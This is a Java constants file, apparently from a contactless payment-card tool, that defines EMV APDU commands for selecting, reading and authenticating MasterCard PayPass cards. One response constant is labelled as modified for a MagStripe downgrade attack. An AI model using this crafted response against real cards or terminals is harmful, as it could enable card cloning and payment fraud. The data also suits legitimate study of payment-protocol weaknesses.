package com.github.jthuraisamy.mastertap;

public class ApduConstants {
    public static final byte[] UNKNOWN_ERROR_RESPONSE = {0x6F, 0x00};
    public static final byte[] SUPPORTED_AID = {(byte) 0xA0, 0x00, 0x00, 0x00, 0x04, 0x10, 0x10};
    public static final byte[] SELECT_PPSE = {
            // CLA
            0x00,
            // INS
            (byte) 0xA4,
            // P1
            0x04,
            // P2
            0x00,
            // Lc
            0x0E,
            // Data: 2PAY.SYS.DDF01
            '2', 'P', 'A', 'Y', '.', 'S', 'Y', 'S', '.', 'D', 'D', 'F', '0', '1',
            // Le
            0x00
    };
    public static final byte[] SELECT_AID = {
            // CLA
            0x00,
            // INS
            (byte) 0xA4,
            // P1
            0x04,
            // P2
            0x00,
            // Lc
            0x07,
            // Data: SUPPORTED_AID
            (byte) 0xA0, 0x00, 0x00, 0x00, 0x04, 0x10, 0x10,
            // Le
            0x00
    };
    public static final byte[] READ_MAGSTRIPE_RECORDS = {0x00, (byte) 0xB2, 0x01, 0x0C, 0x00};
    public static final byte[] GET_PROCESSING_OPTIONS = {
            // CLA
            (byte) 0x80,
            // INS
            (byte) 0xA8,
            // P1
            0x00,
            // P2
            0x00,
            // Lc (variable)
            0x02,
            // Data (variable)
            (byte) 0x83, 0x00,
            // Le
            0x00
    };
    public static final byte[] GET_PROCESSING_OPTIONS_RESPONSE = {
            // Response Message Template
            0x77, 0x0A,
            // Application Interchange Profile (AIP) - modified for MagStripe downgrade attack
            (byte) 0x82, 0x02, 0x00, 0x00,
            // Application File Locator
            (byte) 0x94, 0x04, 0x08, 0x01, 0x01, 0x00,
            // Status Bytes for Normal Processing
            (byte) 0x90, 0x00
    };
    public static final byte[] COMPUTE_CRYPTOGRAPHIC_CHECKSUM = {
            // CLA
            (byte) 0x80,
            // INS
            0x2A,
            // P1
            (byte) 0x8E,
            // P2
            (byte) 0x80,
            // Lc (variable)
            0x04,
            // Data (variable)
            0x00, 0x00, 0x00, 0x00,
            // Le
            0x00
    };
}
